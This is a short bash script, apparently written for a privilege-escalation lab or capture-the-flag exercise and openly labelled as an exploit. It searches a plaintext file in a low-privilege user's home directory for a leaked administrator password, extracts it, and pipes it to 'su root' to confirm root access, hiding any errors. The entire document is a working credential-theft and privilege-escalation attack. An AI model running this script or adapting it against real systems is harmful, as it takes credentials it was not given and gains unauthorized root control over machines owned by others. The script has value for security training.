#!/usr/bin/env bash
set -e

# Exploit vacation file password leak: extract and su to root
pass=$(grep -i password /home/lowpriv/admin_on_vacation.txt | sed -E 's/.* is ([[:alnum:]]+).*/\1/' | head -n1)
echo "$pass" | su root -c whoami 2> /dev/null
